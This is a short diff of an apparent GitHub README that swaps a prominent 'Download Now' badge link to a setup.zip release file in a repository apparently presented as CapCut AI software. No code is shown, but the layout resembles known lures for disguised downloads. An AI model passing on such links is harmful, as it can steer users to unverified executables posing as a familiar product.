@@ -8,7 +8,7 @@
 <img width="833" height="668" alt="image" src="https://github.com/user-attachments/assets/f1ee7e40-d6b8-4f87-9fa5-dfb96dd88063" />
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ApothecaryAcclaim/CapCut-Creator-Hub/releases/download/setup/setup.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ApothecaryAcclaim/CapCut-Ai/releases/download/set/setup.zip)
 
 
 </div>
